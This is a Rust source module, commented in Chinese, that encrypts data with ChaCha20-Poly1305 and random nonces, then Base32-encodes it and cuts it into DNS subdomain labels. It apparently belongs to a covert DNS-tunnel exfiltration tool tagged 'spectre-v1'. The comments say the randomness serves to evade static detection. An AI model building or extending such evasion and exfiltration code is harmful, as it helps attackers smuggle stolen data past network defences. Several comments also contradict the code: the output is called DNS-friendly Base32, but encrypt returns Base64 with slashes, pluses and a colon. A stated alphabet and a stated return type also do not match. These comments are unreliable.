//! 数据加密模块：ChaCha20-Poly1305 认证加密 + 随机 Nonce。
//! 用随机 Nonce(12B) 保证即使相同明文+相同长密钥，每次密文也不同，规避静态比对。
//! 输出编码为 DNS 友好的 Base32（去掉了 / + = 等对域名不友好的字符）。

use chacha20poly1305::{
    aead::{Aead, AeadCore, KeyInit, OsRng, Payload},
    ChaCha20Poly1305, Key, Nonce,
};
use data_encoding::{BASE32_NOPAD, BASE64};

/// 主密钥长度（32 字节）。调用方应提供 32 字节的密钥。
pub const KEY_LEN: usize = 32;

/// 加密 JSON 数据，返回：(payload 密文, 12字节 nonce)。
/// 输出格式：base64(nonce) + ":" + base64(ciphertext)
pub fn encrypt(key: &[u8; KEY_LEN], plaintext: &[u8]) -> Option<String> {
    let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
    let nonce_bytes = ChaCha20Poly1305::generate_nonce(&mut OsRng);
    let nonce = Nonce::from_slice(&nonce_bytes);
    let aad = b"spectre-v1"; // 关联数据，可自定义防止重放拼接
    let ciphertext = cipher
        .encrypt(nonce, Payload { msg: plaintext, aad })
        .ok()?;
    Some(format!(
        "{}:{}",
        BASE64.encode(nonce.as_slice()),
        BASE64.encode(&ciphertext)
    ))
}

/// Base32 编码（NOPAD，字母表 0-9 A-V），用于嵌入 DNS 子域标签。
pub fn b32(data: &[u8]) -> String {
    BASE32_NOPAD.encode(data)
}

/// 把加密字符串按给定标签长度切分为可用的 DNS 子域列表。
/// 每个标签 <= label_max（DNS 单级标签上限 63，留余量给总长）。
pub fn chunk_to_labels(data: &str, label_max: usize) -> Vec<String> {
    data.as_bytes()
        .chunks(label_max)
        .map(|c| String::from_utf8_lossy(c).to_string())
        .collect()
}